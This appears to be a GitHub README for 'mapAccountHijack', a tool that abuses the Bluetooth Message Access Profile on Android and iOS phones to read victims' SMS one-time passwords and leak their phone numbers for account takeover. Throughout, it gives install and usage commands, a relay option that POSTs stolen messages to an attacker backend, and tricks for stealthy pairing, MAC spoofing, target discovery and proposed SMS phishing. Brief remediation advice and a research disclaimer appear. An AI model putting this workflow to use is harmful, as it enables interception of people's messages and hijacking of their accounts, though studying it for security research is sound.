# mapAccountHijack

<h1 align="center">
  <img src="/static/mapAccountHijack.png" width="300px" alt="mapAccountHijack">
</h1>


<h4 align="center">mapAccountHijack is a tool to exploit MAP Account hijack attack over Bluetooth Classic.</h4>

      
<p align="center">
  <a href="#current-state">Current State</a> •
  <a href="#install">Install</a> •
  <a href="#usage">Usage</a> •
  <a href="#a-few-facts-and-tricks">Tips & Tricks</a> •
  <a href="#android">Android</a> •
  <a href="#ios">iOS (Iphone)</a> •
  <a href="#how-to-discover-bluetooth-mac-addresses">Discover MAC addreses</a> •
  <a href="#how-to-spoof-bluetooth-mac-address">Spoof</a> •
  <a href="#how-to-find-mitm-and-dos-attacks-in-bluetooth-classic-devices">Find DoS & MitM</a> •
  <a href="#improvements">Improvements</a>
</p>

mapAccountHijack is a tool designed to carry out a MAP Account hijack attack, which exploits the Message Access Profile (MAP) in Bluetooth Classic devices. This attack enables the theft of Multi-factor Authentication (MFA) codes and One-Time Passwords (OTPs), leading to the successful hijacking of victim accounts on services that rely on SMS-based OTPs during login or recovery processes. The tool is highly valuable for red teaming, penetration testing, bug bounty hunting, and security research, and the attack works on the latest versions of both Android and iOS devices (Samsung, Google Pixel, Iphone).

Additionally, the tool exposes the victim's phone number, either by accessing metadata from previously received SMS messages or by making the victim's smartphone send an SMS to a phone number controlled by the attacker. It serves as a Proof of Concept for Bluetooth Classic attacks or as a component in account hijacking schemes and helps with intercepting, stealing, and relaying SMS messages and phone numbers.

MAP Account hijack attack consists of the following steps:
1. The attacker connects and tries to pair with the victim's smartphone. The attacker might need to spoof the MAC address or spoof the name of the device but it might not be needed at all.
2. Once paired the attacker asks for MAP authorization (it's not needed in some cases!) (typical workflow for smartwatches, cars and speakers)
3. Then the tool leaks the phone number of the victim either by looking at metadata of SMS messages or by sending one to the attacker-controlled phone number.
4. The attacker uses the phone number in OSINT flow to automatically discover additional helpful information such as email addresses or login names.
5. Then the adversary triggers an SMS-based OTP for a service of interest
6. The SMS-based OTP is delivered to the victim's phone
7. The tool extracts the OTP, relays it to the adversary
8. The adversary hijacks the account

## Current state

1. Android devices vulnerable to 2-click MAP account takeover attack
2. Samsung S23 (Android 14, OneUI 6.1) allows sending an SMS
3. Google Pixel 8 (Unknown) has errors while trying to send an SMS message.
4. iOS 17.6.1 vulnerable to 1-click MAP account takeover attack (with certain conditions)
5. iOS 17.6.1 allows sending an SMS message

---
## Install

To install run the following commands:
```sh
sudo apt-get install python3-venv
git clone https://github.com/sgxgsx/mapAccountHijack.git
cd mapAccountHijack
python3 -m venv .venv
source .venv/bin/activate
chmod +x install.sh
sudo ./install.sh
```

Change `/usr/lib/systemd/system/bluetooth.service` configurations:

```sh
sudo vim /usr/lib/systemd/system/bluetooth.service
```
And add --compat to ExecStart
```sh
ExecStart=/usr/libexec/bluetooth/bluetoothd --compat
```
Restart bluetoothd
```sh
sudo service bluetooth stop
sudo systemctl daemon-reload
sudo service bluetooth start
sudo hciconfig -a hci0 reset
```

Now you can use the tool!

## Usage
Before using enable the virtual environment of the tool:

```sh
source ${tool_installation_path}/.venv/bin/activate
```

Run the following command to display the help information:

```sh
python3 mapAccountHijack.py --help
```

```console
usage: mapAccountHijack.py [-h] --address ADDRESS --dest-dir DEST_DIR [--phone-number PHONE_NUMBER] [--sms-content SMS_CONTENT] [--backend BACKEND]

Map Account Hijack

options:
  -h, --help            show this help message and exit
  --address ADDRESS     MAC address of the target device
  --dest-dir DEST_DIR   Destination directory, local, required
  --phone-number PHONE_NUMBER
                        Phone number. If provided an SMS message will be sent to leak the phone number of a victim
  --sms-content SMS_CONTENT
                        SMS content, reserved for future functionality
  --backend BACKEND     Backend URL to relay information, if not provided the relay will not happen
```

#### Run the tool

1. The following command will connect to AA:BB:CC:DD:EE:FF and try to exploit it without relaying newly arrived SMS messages and phone numbers it was able to retrieve. It won't send an SMS message to another device
```sh
python3 mapAccountHijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out
```
2. Connect to AA:BB:CC:DD:EE:FF and try to send an SMS message to the phone number +1234567890
```sh
python3 mapAccountHijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out --phone-number +1234567890
```
3. Connect to AA:BB:CC:DD:EE:FF and relay all the leaked phone numbers and newly arrived SMS messages to a backend url (Will receive POST requests with JSON data: content - data, type - type of the data relayed)
```sh
python3 mapAccountHijack.py --address AA:BB:CC:DD:EE:FF --dest-dir ./out --backend http://127.0.0.1:8080/
```

## A few facts and tricks

1. Pairing can be renegotiated for an already established LTK. Smartphones drop an LTK after 2-3 pairing attempts without knowing an LTK!
2. We can discover almost all Bluetooth Classic MAC addresses by executing Blue's Clues attack.
3. Bluetooth Classic MAC addresses do not change over time
4. We can use MitM and DoS attacks to make this attack look smooth, unnoticeable and easier to establish pairing
5. The behaviour could be exploited if one has Code Execution and control of the IVI (In-vehicle infotainment) system. This would allow them to pivot from the car.
6. The attack can be used as a chain in a pairing and authorization bypass for Bluetooth Classic/Bluetooth Low Energy (devices can derive a key for BC from BLE due to CTKD).
7. Android devices are always pairable. If you were able to fetch a MAC address once, but then couldn't force the pairing because bluetoothctl doesn't see a MAC address. Then run the following command in a loop and eventually, you'll be able to discover the MAC address and then force your pairing. (Change MAC_ADDRESS)
```
while true; do sudo hcitool info MAC_ADDRESS; done
```
8. The exploitation can be done within 10-15 metres.
9. The exploitation can be autonomous and doesn't need to involve a human.
10. To trigger an SMS-based OTP flow in most of the cases one needs to know an email or a login name. To discover them you need to add OSINT flow (e.g. querying a Database or service) and use the leaked phone number as a value for a search.


## Android
Google is working on a fix and hardening.
Android devices are generally vulnerable to a 2-click account takeover.
The following messages would be shown to a victim when the attacker connects to a device with NoInputNoOutput capabilities to make the attack stealthy.
```
bluetoothctl --agent=NoInputNoOutput
```
#### Attack

<img src="/static/SamsungNiNoPair.png"  alt="SamsungNiNoPair">
<img src="/static/SamsungHijackSamsungAccount.png" alt="SamsungHijackSamsungAccount">

## iOS
This bug is not fixed as of the latest iOS version and won't be fixed.
iOS devices are only vulnerable if another device is paired to the iOS device and has Notifications (MAP) permissions. 
This is a 1-click account takeover attack.

For example:
<h1 align="center">
  <img src="/static/notificationsiOS.png" width="300px" alt="notificationsiOS">
</h1>

#### Facts
1. The iPhone will show the name of the device that was previously connected to it. To force this behaviour one needs to change the discoverability of the attacking device:
```
some:~$ bluetoothctl 
Agent registered
[CHG] Controller AA:BB:CC:DD:EE:FF Pairable: yes
[bluetooth]# discoverable off
Changing discoverable off succeeded
```

#### Attack
The attack itself is straightforward:
<img src="/static/iOSRepair.png"  alt="mapAccountHijack">
<img src="/static/iosHijackFacebook.png" alt="iosFacebookHijack">

## Remediation from a user perspective
There are no remediations for this attack unless the user doesn't use MAP in Bluetooth (typical workflow for smartwatches, cars and speakers)
But you can try to do the following:
1. Always compare numbers on both devices (yours and the one you trying to pair with). Numeric Comparison is the only secure pairing method in Bluetooth Classic as of 2024.
2. Try not to allow Message Access Profile in case of Android devices.
3. Do not pair with a device if you do not expect a connection from it, even if it claims to be yours!

## How to discover Bluetooth MAC Addresses
1. [Blue's Clues](https://www.cise.ufl.edu/~butler/pubs/oakland23-tucker.pdf) (allows to discover a full Bluetooth Classic MAC address)
2. Simply Listen (only discoverable devices)
```
some:~$ bluetoothctl --agent=NoInputNoOutput
Agent registered
[CHG] Controller AA:BB:CC:DD:EE:FF Pairable: yes
[bluetooth]# scan on
Discovery started
[CHG] Controller AA:BB:CC:DD:EE:FF Discovering: yes
```
3. Use [WiGLE](https://wigle.net/) to discover the MAC addresses or parts of the MAC addresses in a specific area. If the data lacks NAP and UAP then you can use the information to aid you in discovery of UAP and NAP with the following techniques [Ubertooth - Discovering Bluetooth UAP](https://ubertooth.blogspot.com/2014/06/discovering-bluetooth-uap.html) and [Blue's Clues](https://www.cise.ufl.edu/~butler/pubs/oakland23-tucker.pdf)

## How to spoof Bluetooth MAC Address
It will be soon added to the tool for your ease
You need bdaddr tool to be able to change the MAC address

```
sudo bdaddr -i hci0 FF:EE:DD:CC:BB:AA
sudo hciconfig hci0 resetw
sudo systemctl restart bluetooth.service
```

## How to find MitM and DoS attacks in Bluetooth Classic devices

1. Use [Bluetootlkit](https://github.com/sgxgsx/BlueToolkit) to test for known vulnerabiltiies. Bluetoolkit also contains a list of vulnerabilities we found in cars.
2. Experiment and research :)


## Improvements
Here are some possible improvements:
* Decouple the relay part to another service that runs independently. Communication between mapAccountHijack and relay service via a message queue so that the tool doesn't halt while sending HTTP Requests and waiting for responses.
* Relay via SMS message in case the Internet is not available on the attacker's device.
* Construct VCARD for SMS messages with mapAccountHijack to enable Phishing Attacks. Change the size to accommodate the message, leave 8-bit encoding?
* Inject SMS messages as received for Phishing Attacks.

## Future work
1. Find how to force pairing for iOS with NoInputNoOutput capabilities

## Disclaimer
The authors cannot be liable for any damages. The content here is for research, educational and informative purposes. We do not share everything we have, which might make it worse.

